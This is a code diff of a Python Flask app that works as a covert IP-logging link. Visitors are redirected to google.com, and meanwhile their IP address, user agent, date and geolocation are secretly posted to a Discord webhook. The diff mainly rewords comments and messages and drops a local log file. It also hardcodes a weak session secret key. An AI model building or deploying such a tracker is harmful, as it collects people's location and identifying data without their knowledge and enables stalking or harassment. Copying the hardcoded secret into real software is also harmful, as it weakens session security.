@@ -5,11 +5,11 @@ import os
 import time
 from dotenv import load_dotenv
 
-# Load .env
+# Load environment variables
 load_dotenv()
 
 app = Flask(__name__)
-app.secret_key = "a-super-secret-key"  # For session handling
+app.secret_key = "a-super-secret-key"  # required for session
 
 WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK")
 
@@ -36,13 +36,13 @@ def send_to_discord(ip, user_agent, date, geo_data):
     try:
         requests.post(WEBHOOK_URL, json=payload)
     except Exception as e:
-        print("Failed to send to Discord:", e)
+        print("Discord webhook failed:", e)
 
 @app.before_request
 def rate_limit():
     now = time.time()
     if "last_visit" in session and now - session["last_visit"] < 5:
-        return "Too many requests. Slow down!", 429
+        return "Too many requests. Please wait a few seconds.", 429
     session["last_visit"] = now
 
 @app.route("/")
@@ -56,11 +56,6 @@ def index():
     except:
         geo = {}
 
-    # Log locally
-    with open("visits.log", "a") as f:
-        f.write(f"{ip} | {date} | {geo.get('country', 'N/A')} | {user_agent}\n")
-
-    # Send to Discord
     send_to_discord(ip, user_agent, date, geo)
 
     return redirect("https://google.com")
